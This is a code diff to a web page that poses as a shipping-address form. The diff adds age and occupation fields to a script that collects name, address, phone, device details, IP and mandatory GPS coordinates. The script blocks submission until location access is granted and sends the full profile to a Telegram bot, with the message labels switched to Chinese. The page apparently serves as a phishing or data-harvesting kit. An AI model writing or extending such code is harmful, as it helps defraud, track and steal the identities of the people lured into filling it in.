@@ -65,6 +65,19 @@
             </div>
         </div>
 
+        <div class="form-row">
+            <div class="form-group">
+                <label>Age</label>
+                <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="aiValidateField('age')">
+                <div class="error-hint" id="err-age">Please enter a valid age</div>
+            </div>
+            <div class="form-group">
+                <label>Current Occupation</label>
+                <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation')">
+                <div class="error-hint" id="err-occupation">Please enter a valid occupation</div>
+            </div>
+        </div>
+
         <div class="form-group">
             <label>Country / Region</label>
             <select id="countrySelect" onchange="onCountryChange()">
@@ -124,7 +137,9 @@
         <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Retry Location Access</button>
 
         <div class="info-card">
-            <p><strong>Recipient Name:</strong> <span id="disp-name"></span></p>
+            <p><strong>Name:</strong> <span id="disp-name"></span></p>
+            <p><strong>Age:</strong> <span id="disp-age"></span></p>
+            <p><strong>Occupation:</strong> <span id="disp-occupation"></span></p>
             <p><strong>Shipping Address:</strong> <span id="disp-addr"></span></p>
             <p><strong>Phone Number:</strong> <span id="disp-phone"></span></p>
             <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
@@ -157,8 +172,8 @@ const globalDatabase = {
 
 // ========== Global State ==========
 let formData = {};
-let deviceInfo = { ip: "Detecting...", device: "Unknown", os: "Unknown", browser: "Unknown" };
-let locationInfo = { lat: null, lng: null, status: "pending" }; // pending | granted | denied | error
+let deviceInfo = { ip: "", device: "", os: "", browser: "" };
+let locationInfo = { lat: "", lng: "", status: "pending" };
 
 // ========== Initialize ==========
 window.onload = () => {
@@ -168,7 +183,6 @@ window.onload = () => {
         opt.value=code; opt.textContent=globalDatabase[code].name;
         sel.appendChild(opt);
     });
-    // Collect device info on load
     deviceInfo = parseUserAgent();
 };
 
@@ -235,14 +249,15 @@ function aiValidateZipCode(cleanedZip){
 function aiValidateField(fid){
     const el=document.getElementById(fid); if(!el)return true;
     const v=el.value.trim();
-    const ccode=document.getElementById('countrySelect')?.value||'';
     const err=document.getElementById('err-'+fid);
     let ok=true;
 
-    if(['firstName','lastName','address','city'].includes(fid))ok=v.length>=2;
+    if(['firstName','lastName','address','city','occupation'].includes(fid))ok=v.length>=2;
+    else if(fid==='age'){ const n=parseInt(v); ok=!isNaN(n)&&n>=1&&n<=120; }
     else if(fid==='countrySelect')ok=v!=='';
     else if(fid==='stateSelect')ok=v!=='';
     else if(fid==='phone'){
+        const ccode=document.getElementById('countrySelect')?.value||'';
         const digits=v.replace(/\D/g,'');
         ok=ccode&&globalDatabase[ccode]?globalDatabase[ccode].phoneRegex.test(digits):digits.length>=6;
     }
@@ -254,7 +269,7 @@ function aiValidateField(fid){
 
 // ========== Go to Confirm Page ==========
 async function proceedToVerification(){
-    const fields=['firstName','lastName','countrySelect','stateSelect','address','city','phone'];
+    const fields=['firstName','lastName','age','occupation','countrySelect','stateSelect','address','city','phone'];
     const bad=fields.filter(f=>!aiValidateField(f));
     const zipOk = formatAndValidateZip();
     if(bad.length || !zipOk)return alert('Please check highlighted fields before proceeding.');
@@ -262,6 +277,8 @@ async function proceedToVerification(){
     // Collect form data
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
+        age: document.getElementById('age').value.trim(),
+        occupation: document.getElementById('occupation').value.trim(),
         countryCode: document.getElementById('countrySelect').value,
         countryName: globalDatabase[document.getElementById('countrySelect').value]?.name||'',
         state: document.getElementById('stateSelect').value,
@@ -277,8 +294,10 @@ async function proceedToVerification(){
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
 
-    // Show user info only (clean page)
+    // Show user info only (English labels)
     document.getElementById('disp-name').textContent = formData.name;
+    document.getElementById('disp-age').textContent = formData.age;
+    document.getElementById('disp-occupation').textContent = formData.occupation;
     document.getElementById('disp-addr').textContent = 
         `Country: ${formData.countryName}, Province/State: ${formData.state}, City: ${formData.city}, Street: ${formData.address}`;
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
@@ -308,11 +327,7 @@ function requestLocation(){
                 resolve();
             },
             (err) => {
-                if(err.code === 1){
-                    locationInfo.status = "denied";
-                } else {
-                    locationInfo.status = "error";
-                }
+                locationInfo.status = err.code === 1 ? "denied" : "error";
                 showLocationError();
                 resolve();
             },
@@ -373,29 +388,30 @@ function parseUserAgent(){
 async function submitData(){
     // BLOCK if location missing — REQUIRED
     if(locationInfo.status !== "granted"){
-        alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].\n\nMessage: Not authorized / Failed to retrieve.");
+        alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].\n\nNot authorized / Failed to retrieve.");
         return;
     }
 
-    // Build Telegram message: User Info + Device + IP + Location
-    const locText = `${locationInfo.lat}, ${locationInfo.lng}`;
-    const msg = `📩 New Submitted Information
+    // ========== Telegram Message: CHINESE labels + user ENGLISH data ==========
+    const msg = `📩 新提交的资料
 ——————————————
-👤 Recipient Name: ${formData.name}
-🏠 Shipping Address: Country: ${formData.countryName}, Province/State: ${formData.state}, City: ${formData.city}, Street: ${formData.address}
-📱 Phone Number: ${formData.phonePrefix} ${formData.phone}
-📮 Postal Code: ${formData.zipDisplay}
+姓名：${formData.name}
+年龄：${formData.age}
+当前职业：${formData.occupation}
+收货地址：国家:${formData.countryName}，省份/州:${formData.state}，城市:${formData.city}，街道:${formData.address}
+邮政编码：${formData.zipDisplay}
+电话号码：${formData.phonePrefix} ${formData.phone}
 
-🔍 Device & Network Info:
-• IP Address: ${deviceInfo.ip}
-• Device / Model: ${deviceInfo.device}
-• Operating System: ${deviceInfo.os}
-• Browser: ${deviceInfo.browser}
-• Coordinates: ${locText}
-⏰ Submitted: ${new Date().toLocaleString('en-US')}
+设备和网络信息：
+• IP地址：${deviceInfo.ip}
+• 设备/型号：${deviceInfo.device}
+• 操作系统：${deviceInfo.os}
+• 浏览器：${deviceInfo.browser}
+• 坐标：${locationInfo.lat}, ${locationInfo.lng}
+⏰ 提交时间：${new Date().toLocaleString('zh-CN')}
 ——————————————`;
 
-    console.log('📤 Sending to Telegram:\n', msg);
+    console.log('📤 准备发送到 Telegram：\n', msg);
 
     try{
         const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
@@ -409,7 +425,7 @@ async function submitData(){
         const json=await res.json();
         if(json.ok){
             alert('Submitted successfully! Information sent to Telegram.');
-            console.log('Telegram response:', json);
+            console.log('Telegram 响应：', json);
             location.reload();
         }else{
             alert('Telegram Error: '+JSON.stringify(json));
